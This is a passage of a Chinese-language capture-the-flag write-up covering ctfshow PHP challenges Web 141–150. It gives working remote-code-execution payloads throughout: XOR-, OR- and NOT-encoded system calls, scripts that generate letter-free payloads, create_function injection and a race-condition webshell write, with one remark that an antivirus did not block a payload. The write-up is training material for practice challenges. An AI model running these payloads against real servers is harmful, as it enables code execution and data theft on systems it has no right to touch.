href="#1-42-Web-141-—-eval-“return-v1-v3-v2-”" class="headerlink" title="1.42 Web 141 — eval(“return $v1$v3$v2;”);"></a>1.42 Web 141 — eval(“return $v1$v3$v2;”);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="comment">#error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]) &amp;&amp; isset($_GET[&#x27;v3&#x27;]))&#123;    $v1 = (String)$_GET[&#x27;v1&#x27;];    $v2 = (String)$_GET[&#x27;v2&#x27;];    $v3 = (String)$_GET[&#x27;v3&#x27;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#x27;/^\W+$/&#x27;, $v3))&#123;        # v3 不能是 字母、数字、下划线            $code =  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 = &quot;.$code;        &#125;    &#125;&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>\w</strong>      #匹配字母、数字、下划线。等价于 [A-Za-z0-9_] </p></blockquote><p><strong>测试：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>highlight_file(<span class="keyword">__FILE__</span>);<span class="comment"># $code =  eval(&quot;return $v1$v3$v2;&quot;);// eval(&quot;return 1;phpinfo();&quot;);#不可行// eval(&quot;return 0;phpinfo();&quot;);#不可行// eval(&quot;return 1-phpinfo();&quot;);#可行eval(&quot;return 1+phpinfo();&quot;);#可行eval(&quot;return 2+phpinfo();&quot;);#可行?&gt;    # 也就是说，数字可以与命令进行运算</span></span><br></pre></td></tr></table></figure><ul><li><p>由于 v1 v2 也只能是 数字，那么我们可以构造 <code>1+phpinfo()+1</code> 等式子</p></li><li><p>v3 不能是 字母、数字、下划线，那么现在如何构造 v3?</p><p>无字母、数字 RCE</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/脚本<span class="comment"># python re.py输出执行函数:&#x27;system&#x27;请输出函数参数:&#x27;tac f*&#x27;(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;)</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=-(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# -?v1=1&amp;v3=%2b(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# 尝试过后 不能直接用+ 要进行 URL 编码#+?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%26(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# &amp; %26?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure><p>也就是说，加减乘除，取反、异或，都可能</p><p><strong>| 拼接 无字母数字脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:05# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;[a-z]|[0-9]&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i | j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;rce_or.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;|&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure><h2 id="1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d"><a href="#1-43-Web-142-—-d-int-v1-0x36d-0x36d-0x36d-0x36d-0x36d" class="headerlink" title="1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);"></a>1.43 Web 142 — $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;        <span class="variable">$d</span> = (int)(<span class="variable">$v1</span> * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);        sleep(<span class="variable">$d</span>);        <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);    &#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=0</span><br></pre></td></tr></table></figure><h2 id="1-44-Web-143-—-141-plus"><a href="#1-44-Web-143-—-141-plus" class="headerlink" title="1.44 Web 143 — 141 plus"></a>1.44 Web 143 — 141 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">141的plus版本</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>过滤了一些运算符 <code>+  -  &amp;  %  / ~ $  _  .  </code></li><li>过滤了 <code>;</code>  ，使用 <code>?&gt;</code>  代替</li></ul><p>仍旧有我们可以利用的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# *?v1=1&amp;v3=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# ^?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截</span></span><br></pre></td></tr></table></figure><p><strong>^异或拼接 无字母数字脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-# @Time : 20.12.4 23:06# @author:lonmarimport recontent = &#x27;&#x27;preg = &#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/&#x27; # 题目过滤正则# 生成字典for i in range(256):    for j in range(256):        if not (re.match(preg, chr(i), re.I) or re.match(preg, chr(j), re.I)):            k = i ^ j            if 32 &lt;= k &lt;= 126:                a = &#x27;%&#x27; + hex(i)[2:].zfill(2)                b = &#x27;%&#x27; + hex(j)[2:].zfill(2)                content += (chr(k) + &#x27; &#x27; + a + &#x27; &#x27; + b + &#x27;\n&#x27;)f = open(&#x27;exp_xor.txt&#x27;, &#x27;w&#x27;)f.write(content)while True:    payload1 = &#x27;&#x27;    payload2 = &#x27;&#x27;    code = input(&quot;data:&quot;)    for i in code:        f = open(&#x27;rce_or.txt&#x27;)        lines = f.readlines()        for line in lines:            if i == line[0]:                payload1 = payload1 + line[2:5]                payload2 = payload2 + line[6:9]                break    payload = &#x27;(&quot;&#x27;+payload1+&#x27;&quot;^&quot;&#x27;+payload2+&#x27;&quot;)&#x27;    print(&quot;payload: &quot;+ payload)</span></span><br></pre></td></tr></table></figure><h2 id="1-45-Web-144-—-143-plus"><a href="#1-45-Web-144-—-143-plus" class="headerlink" title="1.45 Web 144 — 143 plus"></a>1.45 Web 144 — 143 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">143的plus版本</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; check(<span class="variable">$v3</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;<span class="keyword">function</span> check(<span class="variable">$str</span>)&#123;    <span class="built_in">return</span> strlen(<span class="variable">$str</span>)===1?<span class="literal">true</span>:<span class="literal">false</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=%2f(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v2=1# / 这次竟然 火绒没有拦截?v1=1&amp;v2=%00*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# %00*?v1=1&amp;v2=^(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%01%06%02&quot;^&quot;%7f%60%60%21%60%28&quot;);&amp;v3=1# ^</span></span><br></pre></td></tr></table></figure><h2 id="1-46-Web-145-—-144-plus"><a href="#1-46-Web-145-—-144-plus" class="headerlink" title="1.46 Web 145 — 144 plus"></a>1.46 Web 145 — 144 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">144的plus版本</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>过滤了 <code>;  ^  &lt;   &quot;   &gt;  </code> 和我们能用到的运算符</li><li>使用 <code>|   ?</code>    绕过</li></ul><p><strong>~ 脚本</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php//在命令行中运行/*author yu22x*/fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);<span class="variable">$system</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);<span class="variable">$command</span>=str_replace(array(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); <span class="built_in">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure><p><strong>三目运算符</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;return 1?phpinfo():1;&quot;</span>);<span class="comment">#可行</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload ?v1=1&amp;v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):&amp;v2=1</span></span><br></pre></td></tr></table></figure><h2 id="1-47-Web-146-—-145-plus"><a href="#1-47-Web-146-—-145-plus" class="headerlink" title="1.47 Web 146 — 145 plus"></a>1.47 Web 146 — 145 plus</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">145的plus版本</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; isset(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;                die(<span class="string">&#x27;get out hacker!&#x27;</span>);        &#125;        <span class="keyword">else</span>&#123;            <span class="variable">$code</span> =  <span class="built_in">eval</span>(<span class="string">&quot;return $v1$v3<span class="variable">$v2</span>;&quot;</span>);            <span class="built_in">echo</span> <span class="string">&quot;$v1$v3<span class="variable">$v2</span> = &quot;</span>.<span class="variable">$code</span>;        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><ul><li>过滤了 <code>:</code></li><li>不能使用三目运算符了</li></ul><p><strong>测试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);// <span class="built_in">eval</span>(<span class="string">&quot;return 1==phpinfo()||1;&quot;</span>);<span class="comment">#可行// eval(&quot;return 1==phpinfo()|1;&quot;);#可行// eval(&quot;return 1===phpinfo()|1;&quot;);#可行// eval(&quot;return 1===phpinfo()||1;&quot;);#可行 eval(&quot;return 1=phpinfo()||1;&quot;);#不可行//eval(&quot;return 1=phpinfo()||1;&quot;);#不可行</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?v1=1&amp;v3===(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</span></span><br></pre></td></tr></table></figure><h2 id="1-48-Web-147-—-create-function-命令注入"><a href="#1-48-Web-147-—-create-function-命令注入" class="headerlink" title="1.48 Web 147 — create_function 命令注入"></a>1.48 Web 147 — create_function 命令注入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phphighlight_file(__FILE__);<span class="keyword">if</span>(isset(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);    &#125;&#125;</span><br></pre></td></tr></table></figure><p><a href="https://my.oschina.net/huyex/blog/2885273">create_function()</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)类似于function f($a) &#123;  echo $a.&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure><p>那么如果我们第二个参数传入 <strong>echo 1;}phpinfo();/</strong>/<br>就等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function f($a) &#123;  echo 1;&#125;phpinfo();//&#125;从而执行phpinfo()命令</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payloadGET ?show=2;&#125;system(&quot;tac f*&quot;);/*POST ctf=\create_function# \ %5c</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/08/05/Rftu7sEcSJiKqbM.png" alt="image-20210805185639951"></p><h2 id="1-49-Web-148-—-中文变量"><a href="#1-49-Web-148-—-中文变量" class="headerlink" title="1.49 Web 148 — 中文变量"></a>1.49 Web 148 — 中文变量</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude <span class="string">&#x27;flag.php&#x27;</span>;<span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;        die(<span class="string">&quot;error&quot;</span>);    &#125;    @<span class="built_in">eval</span>(<span class="variable">$code</span>);&#125;<span class="keyword">else</span>&#123;    highlight_file(__FILE__);&#125;<span class="keyword">function</span> <span class="function"><span class="title">get_ctfshow_fl0g</span></span>()&#123;    <span class="built_in">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);&#125;</span><br></pre></td></tr></table></figure><ul><li>未过滤 <code>^   ;</code>    ，可直接异或构造</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># payload?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span></span><br></pre></td></tr></table></figure><ul><li>利用中文变量</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;<span class="variable">$&#123;$哈&#125;</span>[哼](<span class="variable">$&#123;$哈&#125;</span>[嗯]);&amp;哼=system&amp;嗯=tac f*其实也是利用异或构造<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>; 异或出来的结果是 _GET</span><br></pre></td></tr></table></figure><h2 id="1-50-Web-149-—-条件竞争"><a href="#1-50-Web-149-—-条件竞争" class="headerlink" title="1.50 Web 149 — 条件竞争"></a>1.50 Web 149 — 条件竞争</h2> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);highlight_file(__FILE__);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;file_put_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);<span class="variable">$files</span> = scandir(<span class="string">&#x27;./&#x27;</span>); foreach(<span class="variable">$files</span> as <span class="variable">$file</span>) &#123;    <span class="keyword">if</span>(is_file(<span class="variable">$file</span>))&#123;        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;            unlink(<span class="variable">$file</span>);        &#125;    &#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 在每次 写文件之前之后，都会删除 除了 index.php 之外的任何文件</span></span><br></pre></td></tr></table></figure><ul><li>解一：直接在 index.php 当中写入代码</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 总是成功不了</span></span><br></pre></td></tr></table></figure><ul><li>解二：条件竞争</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. 写入 ?ctf=1.phpshow=&lt;?php system(<span class="string">&#x27;ls /&#x27;</span>); ?&gt;2. 访问 /1.php3. 二者同时进行爆破</span><br></pre></td></tr></table></figure><h2 id="1-51-Web-150-—"><a href="#1-51-Web-150-—" class="headerlink" title="1.51 Web 150 —"></a>1.51 Web 150 —</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对我们以前的内容进行了小结，我们文件上传系列再见！</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude(<span class="string">&quot;flag.php&quot;</span>);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private <span class="variable">$username</span>;    private <span class="variable">$password</span>;    private <span class="variable">$vip</span>;    private <span class="variable">$secret</span>;    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;        <span class="variable">$this</span>-&gt;vip = 0;        <span class="variable">$this</span>-&gt;secret = <span class="variable">$flag</span>;    &#125;    <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;secret;    &#125;    public <span class="keyword">function</span> <span class="function"><span class="title">isVIP</span></span>()&#123;        <span class="built_in">return</span> <span class="variable">$this</span>-&gt;vip?TRUE:FALSE;        &#125;    &#125;    <span class="keyword">function</span> __autoload(<span class="variable">$class</span>)&#123;        <span class="keyword">if</span>(isset(<span class="variable">$class</span>))&#123;            <span class="variable">$class</span>();    &#125;&#125;<span class="comment">#过滤字符$key = $_SERVER[&#x27;QUERY_STRING&#x27;];if(preg_match(&#x27;/\_| |\[|\]|\?/&#x27;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf = $_POST[&#x27;ctf&#x27;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)===FALSE)&#123;    include($ctf);&#125;</span></span><br></pre></td></tr></table></figure><p><strong>分析：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; strrpos(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===FALSE)&#123;    include(<span class="variable">$ctf</span>);&#125;<span class="comment"># 1.使 $isVIP = 1# 2.$ctf 中不能包含 :</span></span><br></pre></td></tr></table></figure><p><strong>写入日志</strong></p><p><img src="https://i.loli.net/2021/08/05/6HVGre1oWQunET9.png" alt="image-20210805210149883"></p><p><strong>日志包含</strong></p><figure 